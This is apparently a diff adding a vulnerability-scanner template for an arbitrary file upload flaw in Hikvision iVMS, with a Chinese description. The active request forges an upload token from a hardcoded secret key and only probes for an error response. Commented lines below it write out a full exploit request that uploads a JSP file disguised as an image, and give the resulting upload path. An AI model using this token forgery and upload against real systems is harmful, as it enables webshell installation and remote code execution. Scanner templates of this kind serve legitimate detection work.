@@ -1,0 +1,54 @@
+id: hikvision-ivms-token-bypass-arbitrary-file-upload
+
+info:
+  name: hikvision-ivms-token-bypass-arbitrary-file-upload
+  author: SleepingBag945
+  severity: critical
+  description: 海康威视iVMS综合安防系统任意文件上传漏洞，攻击者通过获取密钥任意构造token，请求/resourceOperations/upload接口任意上传文件，导致获取服务器webshell权限，同时可远程进行恶意代码执行。
+  reference:
+    - https://blog.csdn.net/qq_41904294/article/details/130807691
+  tags: hikvision,ivms
+
+http:
+  - raw:
+      - |
+        POST /eps/api/resourceOperations/upload?token={{to_upper(md5(concat("{{RootURL}}","/eps/api/resourceOperations/uploadsecretKeyIbuilding")))}} HTTP/1.1
+        Host: {{Hostname}}
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.127 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+
+        service={{url_encode(concat("{{RootURL}}","/home/index.action"))}}
+ 
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code_1 == 200 && contains(body_1,'errorMessage') && contains(body_1,'The current request is not a multipart request')"
+        condition: and
+
+
+
+# POST /eps/api/resourceOperations/upload?token=构造的token值 HTTP/1.1
+# Host: your-ip
+# User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0
+# Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+# Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+# Connection: close
+# Cookie: ISMS_8700_Sessionname=A29E70BEA1FDA82E2CF0805C3A389988
+# Content-Type: multipart/form-data;boundary=----WebKitFormBoundaryGEJwiloiPo
+# Upgrade-Insecure-Requests: 1
+# Content-Length: 174
+ 
+# ------WebKitFormBoundaryGEJwiloiPo
+# Content-Disposition: form-data; name="fileUploader";filename="1.jsp"
+# Content-Type: image/jpeg
+ 
+# test
+# ------WebKitFormBoundaryGEJwiloiPo
+
+
+# xxx/eps/upload/04fd3bc47271462cb62bed6f3f9c2d1b.jsp
